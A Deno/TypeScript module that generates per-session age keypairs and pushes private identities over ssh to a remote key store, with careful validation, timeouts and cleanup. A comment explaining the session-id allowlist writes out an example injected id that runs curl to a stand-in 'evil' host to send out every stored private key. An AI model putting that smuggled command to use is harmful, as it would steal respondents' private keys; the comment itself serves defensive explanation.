/**
 * Per-session age keypairs.
 *
 * The web tier mints the pair, keeps the recipient (public), and pushes the
 * identity (private) to the key box over the WireGuard mesh. It never writes
 * the identity to disk and never logs it.
 *
 * Everything here fails closed. A session whose identity never reached the key
 * box is a session whose PDF could never be produced, so there is no value in
 * letting the submission continue.
 */

import { generateX25519Identity, identityToRecipient } from '@age/age-encryption';
import { increment } from './metrics.ts';

export interface SessionKeypair {
  identity: string;
  recipient: string;
}

export type IdentityTransport = (sessionId: string, identity: string) => Promise<void>;

/**
 * A push that failed after the transport had already started.
 *
 * `ambiguous` is the whole point. When ssh is killed at the deadline -- or dies
 * mid-write, or the far end fills its disk -- the sender cannot know whether the
 * identity landed. `cat > file` may have created a complete key, a truncated
 * one, or nothing at all, and the failure looks identical in every case.
 *
 * Callers must treat ambiguous === true as "the key box may be holding a key
 * for a session that will never exist" and run their cleanup. Only a rejection that
 * happens BEFORE any transport runs (a malformed session id) is unambiguous,
 * because nothing was ever sent.
 */
export class IdentityPushFailed extends Error {
  readonly ambiguous: boolean;

  constructor(ambiguous: boolean) {
    // Deliberately contentless: no identity, no session id, no callee message.
    super('identity transport failed');
    this.name = 'IdentityPushFailed';
    this.ambiguous = ambiguous;
  }
}

/**
 * Session ids are interpolated into a command that a REMOTE SHELL executes, so
 * they are validated against an allowlist before they can get near one.
 *
 * The subtlety worth spelling out: `new Deno.Command('ssh', { args: [...] })`
 * spawns no local shell, which makes the array form look safe. It is -- locally.
 * But ssh's trailing argument is the remote command, and sshd concatenates its
 * arguments into one string and feeds it to the login shell. A session id of
 *     x; curl http://evil/$(cat /var/lib/keybox/keys/*.key); #
 * would therefore run on the one machine holding every respondent's private
 * key. The local argv boundary says nothing about what happens after the string
 * crosses the network.
 *
 * The charset deliberately matches the key box's keystore SESSION_ID exactly.
 * This side must not accept an id the key box will later reject, or pushes
 * succeed and renders mysteriously fail; and it must not accept one the key
 * box would take blindly. Both ends move together.
 */
const SESSION_ID = /^[0-9a-fA-F-]{8,64}$/;

export function assertSafeSessionId(sessionId: string): void {
  if (!SESSION_ID.test(sessionId)) throw new Error('invalid session id');
}

/*
 * The key box: wherever session identities are pushed to live.
 *
 * The env vars are ICELANDonion_* for historical reasons: the role passed
 * through the Iceland onion host while the Romania box was unreachable. It now
 * runs on Romania again -- aformulationiontruth.com:2078, Debian, no database
 * -- reached via the apex because `fib.aformulationiontruth.com` still has no
 * DNS record despite the design naming it throughout.
 *
 * The constants are named KEYBOX_* rather than after any particular site: the
 * role has already relocated once, and code that hardcodes a country in its
 * identifiers has to be edited every time infrastructure moves. The env vars
 * carry the deployment-specific name; the code only cares that there is a box.
 *
 * What must NOT move with it is the property that makes this design worth
 * anything: the key box holds identities and no ciphertext, and the database
 * holds ciphertext and no identities. Pointing these at the same host as the
 * database would satisfy every type in this file and quietly delete the
 * security argument.
 */
const KEYBOX_SSH = Deno.env.get('ICELANDonion_SSH_DEST') || '';
const KEYBOX_KEY_DIR = Deno.env.get('ICELANDonion_KEY_DIR') || '';
const KEYBOX_SSH_KEY = Deno.env.get('ICELANDonion_SSH_KEY') || '';
/**
 * Non-standard ports are the norm here, not the exception: the key box listens
 * on 2078. Defaulting to 22 silently dials the wrong port and surfaces as a
 * connection failure that looks like the box being down.
 */
const KEYBOX_SSH_PORT = Deno.env.get('ICELANDonion_SSH_PORT') || '22';

export async function generateSessionKeypair(): Promise<SessionKeypair> {
  const identity = await generateX25519Identity();
  return { identity, recipient: await identityToRecipient(identity) };
}

/**
 * The offline break-glass recipient. Absent configuration is fatal rather than
 * defaulted: silently encrypting to the session key alone would produce data
 * that becomes unrecoverable the moment the session key is shredded.
 */
export function breakglassRecipient(): string {
  const r = Deno.env.get('BREAKGLASS_AGE_RECIPIENT');
  if (!r) throw new Error('BREAKGLASS_AGE_RECIPIENT not configured');
  return r;
}

/**
 * How long the whole push may take before the child is killed.
 *
 * ConnectTimeout alone is not enough: it bounds the TCP handshake and nothing
 * after it. An ssh that connects and then stalls -- a wedged sshd, a half-open
 * mesh path, a full disk on the far end -- leaves child.output() awaiting
 * forever, and this runs inside the request that gates gate-submit. The user
 * would watch a spinner until their browser gave up.
 */
const PUSH_DEADLINE_MS = 20_000;

/**
 * Default transport: ssh over the mesh, identity delivered on stdin so it never
 * touches this host's filesystem. StrictHostKeyChecking=yes is the point of the
 * exercise -- an unpinned host key would let anything on the mesh collect keys.
 *
 * BatchMode=yes is not redundant with it: StrictHostKeyChecking stops ssh
 * *accepting* an unknown host, while BatchMode stops it *asking* about one, or
 * asking for a key passphrase. Without it a prompt is written to a stderr we
 * discard and ssh waits on a stdin we have closed, which presents as a hang
 * rather than an error.
 */
const scpTransport: IdentityTransport = async (sessionId, identity) => {
  // Re-checked here, not only at the entry point: this is the function that
  // builds a remote shell command, so it does not delegate its own safety.
  assertSafeSessionId(sessionId);
  if (!KEYBOX_SSH || !KEYBOX_KEY_DIR) {
    throw new Error('key box transport not configured');
  }
  const cmd = new Deno.Command('ssh', {
    args: [
      '-p',
      KEYBOX_SSH_PORT,
      '-i',
      KEYBOX_SSH_KEY,
      '-o',
      'IdentitiesOnly=yes',
      '-o',
      'StrictHostKeyChecking=yes',
      '-o',
      'BatchMode=yes',
      '-o',
      'ConnectTimeout=10',
      KEYBOX_SSH,
      // Single-quoted as belt-and-braces. The allowlist above already excludes
      // every metacharacter including the quote itself, so this cannot be
      // broken out of -- but the quoting means a future widening of the
      // charset degrades to "wrong filename" rather than "remote execution".
      `umask 077 && cat > '${KEYBOX_KEY_DIR}/${sessionId}.key'`,
    ],
    stdin: 'piped',
    stdout: 'null',
    stderr: 'null',
  });
  const child = cmd.spawn();
  const deadline = setTimeout(() => {
    // The child may have exited between the timer firing and this running.
    try {
      child.kill('SIGKILL');
    } catch {
      // Already gone; nothing to kill.
    }
  }, PUSH_DEADLINE_MS);

  try {
    const w = child.stdin.getWriter();
    await w.write(new TextEncoder().encode(identity));
    await w.close();
    const out = await child.output();
    if (!out.success) {
      // Covers a killed child too: SIGKILL surfaces as success === false, so a
      // timeout and a refusal fail identically and neither says why out loud.
      throw new Error('identity transport failed');
    }
  } finally {
    // Must clear on the success path as well, or the timer holds the event loop
    // open for its full duration after the push has already returned.
    clearTimeout(deadline);
  }
};

/**
 * Withdraw a session identity from the key box.
 *
 * Called when a submission fails *after* its key was pushed -- including when
 * the push itself failed ambiguously, since a killed `cat > file` may have left
 * a complete or truncated key behind. Without this, the key box accumulates
 * identities for sessions that never came into being.
 *
 * Deliberately best-effort: the caller is already failing a submission and must
 * not fail differently because the withdrawal also failed. A key that survives
 * this is collected by the keystore's absolute expiry ceiling, which exists
 * precisely as the backstop for this path.
 *
 * `rm -f` so a key that never landed is not an error.
 */
export async function shredRemoteIdentity(
  sessionId: string,
  transport?: (sessionId: string) => Promise<void>,
): Promise<void> {
  // Validated before anything runs, exactly as pushIdentity does: this also
  // builds a remote shell command, and an unvalidated id here would delete
  // paths outside the key directory.
  assertSafeSessionId(sessionId);

  const run = transport ?? (async (id: string) => {
    if (!KEYBOX_SSH || !KEYBOX_KEY_DIR) throw new Error('key box transport not configured');
    const res = await new Deno.Command('ssh', {
      args: [
        '-p',
        KEYBOX_SSH_PORT,
        '-i',
        KEYBOX_SSH_KEY,
        '-o',
        'IdentitiesOnly=yes',
        '-o',
        'StrictHostKeyChecking=yes',
        '-o',
        'BatchMode=yes',
        '-o',
        'ConnectTimeout=10',
        KEYBOX_SSH,
        `rm -f '${KEYBOX_KEY_DIR}/${id}.key'`,
      ],
      stdout: 'null',
      stderr: 'null',
    }).output();
    if (!res.success) throw new Error('identity withdrawal failed');
  });

  try {
    await run(sessionId);
  } catch {
    // Swallowed on purpose -- see above -- but COUNTED. Silent best-effort is
    // how a permanently broken withdrawal path stays invisible: every call
    // looks identical whether it worked or not. This metric is the only signal
    // that keys are accumulating on the key box, and the absolute expiry
    // ceiling is what stops that being unbounded.
    increment('keybox.withdraw_failed');
  }
}

export async function pushIdentity(
  sessionId: string,
  identity: string,
  transport: IdentityTransport = scpTransport,
): Promise<void> {
  // Validated before ANY transport runs, including injected ones. A custom
  // transport is not automatically safer than the default, and this is the
  // single choke point every caller passes through.
  //
  // This throw is deliberately NOT an IdentityPushFailed: nothing has been sent
  // yet, so there is nothing for a caller to clean up.
  assertSafeSessionId(sessionId);

  try {
    await transport(sessionId, identity);
  } catch {
    // Everything past assertSafeSessionId is ambiguous. The transport ran; we
    // do not know how far it got. Re-thrown as a bare category so no callee
    // message can carry key material.
    throw new IdentityPushFailed(true);
  }
}
